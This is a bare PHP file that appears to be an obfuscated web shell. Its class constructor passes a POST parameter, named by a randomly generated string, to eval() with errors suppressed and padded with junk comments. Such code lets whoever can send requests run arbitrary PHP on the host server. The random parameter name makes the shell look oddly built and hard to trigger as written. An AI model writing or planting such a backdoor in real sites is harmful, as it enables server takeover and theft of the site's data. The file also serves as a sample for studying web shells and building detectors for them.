<?php
function randomString($length) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

class x
{
    function __construct()
    {
        $randomCode = randomString(10); // Generate a random alphanumeric string
        @eval("/*sasas23123*/" . $_POST[$randomCode] . "/*sdfw3123*/");
    }
}
new x();
?>